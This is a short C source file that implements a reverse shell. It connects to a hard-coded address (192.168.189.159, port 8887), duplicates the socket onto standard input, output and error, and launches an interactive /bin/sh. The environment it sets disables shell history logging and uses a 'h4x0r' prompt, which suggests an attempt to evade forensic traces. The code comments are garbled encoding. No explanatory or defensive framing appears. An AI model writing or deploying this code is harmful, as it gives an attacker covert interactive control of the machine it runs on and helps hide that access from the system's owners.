#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/shm.h>

char shell[] = "/bin/sh";
char *argv[] = { shell, "-i", NULL };
char *envp[] = { "TERM=linux", "PS1=h4x0r-> ", "BASH_HISTORY=/dev/null",
                 "HISTORY=/dev/null", "history=/dev/null", "HOME=/usr/_h4x_","HISTFILE=/dev/null",
                 "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };

#define MYPORT  8887
#define BUFFER_SIZE 1024


int main()
{
    ///����sockfd
    int sock_cli = socket(AF_INET,SOCK_STREAM, 0);

    ///����sockaddr_in
    struct sockaddr_in servaddr;
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(MYPORT);  ///�������˿�
    servaddr.sin_addr.s_addr = inet_addr("192.168.189.159");  ///������ip

    ///���ӷ��������ɹ�����0�����󷵻�-1
    if (connect(sock_cli, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    {
        perror("connect");
        exit(1);
    }
	// send(sock_cli, sendbuf, strlen(sendbuf),0); ///����
	// if(strcmp(sendbuf,"exit\n")==0)
		// break;
	
	dup2(sock_cli, 0);
	dup2(sock_cli, 1);
	dup2(sock_cli, 2);

	execve(shell, argv, envp);
	
	

    close(sock_cli);
    return 0;
}